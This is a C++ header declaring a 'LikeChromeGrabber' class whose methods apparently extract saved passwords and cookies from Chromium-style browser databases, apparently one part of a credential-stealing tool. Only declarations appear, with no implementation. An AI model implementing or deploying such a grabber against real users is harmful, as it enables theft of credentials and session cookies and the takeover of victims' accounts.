#ifndef LikeChromeGrabber_H
#define LikeChromeGrabber_H
#include "IGrabber.h"

class LikeChromeGrabber:public IGrabber {
public:
	LikeChromeGrabber(const wchar_t* path, const wchar_t* user_t);
	vector <Profile> grabPasswords();
	vector <Cookie> grabCookies();
private:
	wchar_t *browserPath;
	wchar_t *user_t;
	vector <const wchar_t*> discs;

	vector <Profile> sqlPasswordsQuery(const wchar_t* DB_WAY);
	vector <Cookie> sqlCookiesQuery(const wchar_t* DB_WAY);
	const wchar_t * copyTable(const wchar_t *disc, const wchar_t* nameOfTable);
	bool fileExists(LPCTSTR fname);
};

#endif